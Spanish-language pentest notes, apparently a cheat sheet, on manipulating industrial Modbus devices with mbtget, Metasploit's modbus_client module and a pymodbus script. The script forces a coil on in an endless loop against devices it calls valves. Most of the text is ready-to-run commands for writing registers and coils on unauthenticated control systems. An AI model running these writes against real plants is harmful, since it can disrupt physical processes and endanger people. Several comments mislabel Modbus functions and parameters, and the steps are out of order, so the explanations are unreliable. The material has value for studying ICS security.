# Inyección comandos en Modbus 

Tags: #SCADA #OT #Modbus #MBGET #Python #Metasploit 

## MBTGET 

```bash 
❯ git clone https://github.com/sourceperl/mbtget       # Clonar e instalar la herramienta 

	❯ perl Makefile.PL
	❯ make 
	❯ sudo make install 
```

```bash 
❯ mbtget -r1 -a 40 -p 502 IP      # Para leer un registro

	# r = Seguida de un número indica el tipo de registro que se está leyendo. En este caso, `1` corresponde a los "Input Registers" (registros de entrada). Los registros de entrada son usados para almacenar datos de entrada de dispositivos, como sensores.
	# a = Especifica el número de registro que se va a leer. Aquí, el registro es el número 40. Esto significa que MBTGET leerá el valor almacenado en el registro de entrada número 40 del dispositivo Modbus. Esto significa que MBTGET escribirá el valor '1' en el registro de holding número 40 del dispositivo Modbus.
	# p = Indica el puerto de comunicación. El puerto 502 es el puerto predeterminado para Modbus TCP. Este puerto se utiliza para establecer la conexión con el dispositivo Modbus.

❯ mbtget -w5 1 -a 40 -p 502 IP     # Para escribir en el resgitro el valor de '1'

	# w = Seguida de un número indica que se va a escribir en un registro de holding (Holding Register). El número '5' especifica la función Modbus que se utilizará para la escritura, en este caso, la función '5' es usada para escribir en un registro de holding. El valor '1' es el dato que se va a escribir en el registro.

❯ mbtget -w5 0 -a 40 -p 502 IP     # Para regresar el valor que tenia a '0'

❯ mbtget -m tcp -a IP -p 502 -u 1 -f 3 -r 0 -c 1   

	# m tcp = Especifica el modo Modbus TCP.
	# a IP = Es la dirección IP del dispositivo Modbus.
     # p 502 = Es el puerto TCP utilizado (502 es el puerto estándar para Modbus TCP).
	# u 1 = Es la unidad de destino (unidad 1).
	# f 3 = Especifica la función de lectura de registros de holding.
	# r 0 = Es el registro de inicio (registro 0).
	# c 1 = Especifica la cantidad de registros a leer (1 registro).

❯ mbtget -m tcp -a IP -p 502 -u 1 -f 6 -r 0 -d 12345

	# f 6 = Especifica la función de escritura en un solo registro de holding.
	# d 12345 = Es el valor de datos a escribir en el registro.
```

## Metasploit

```bash 
# Configuración para leer registros 
❯ use auxiliary/scanner/scada/modbus_client
	❯ set RHOSTS IP
	❯ set RPORT 502
	❯ set ACTION READ_HOLDING_REGISTERS     # La acción a realizar (`READ_HOLDING_REGISTERS`, `WRITE_SINGLE_REGISTER`, etc.).
	❯ set UNIT_NUMBER 1                     # El número de unidad del dispositivo Modbus.
	❯ set START_ADDRESS 40                  # La dirección de inicio del registro.
	❯ set REGISTER_COUNT 1                  # El número de registros a leer o escribir.
	❯ run                                   # Ejecutar el módulo 

# Lo que se obtendría 
[*] Reading 1 holding registers starting at address 40
[*] Register 40: 5678
```

```bash 
# Configuración para escribir en un registro 
❯ use auxiliary/scanner/scada/modbus_client
	❯ set RHOSTS IP
	❯ set RPORT 502
	❯ set ACTION WRITE_COILS
	❯ set DATA_ADDRESS 40                   # El valor de datos a escribir (si se está escribiendo en un registro).
	❯ set NUMBER 1                          # El número de unidad del dispositivo Modbus.
	❯ set DATA_COILS 1                      # El número de registros a leer o escribir.
	❯ run                                   # Ejecutar el módulo 
```

```bash 
# Configuración para escribir en un registro 
❯ use auxiliary/scanner/scada/modbus_client
	❯ set RHOSTS IP
	❯ set RPORT 502
	❯ set ACTION WRITE_SINGLE_REGISTER
	❯ set UNIT_NUMBER 1
	❯ set START_ADDRESS 40
	❯ set DATA 12345                      # El valor de datos a escribir (si se está escribiendo en un registro).
	❯ run                                 # Ejecutar el módulo 

# Lo que se obtendría 
[*] Writing value 12345 to holding register at address 40
[*] Write successful
```

## Python 

```bash 
❯ python3 script.py                  # Ejecutar el script 
❯ pip3 install pymodbus==2.4.0       # Instalar la librería 
```

```python
from pymodbus.client.sync import ModbusTcpClient as Client

# Connect to some of the devices we think are valves
client = Client('IP')

while True:
    client.write_coil(40, True)
```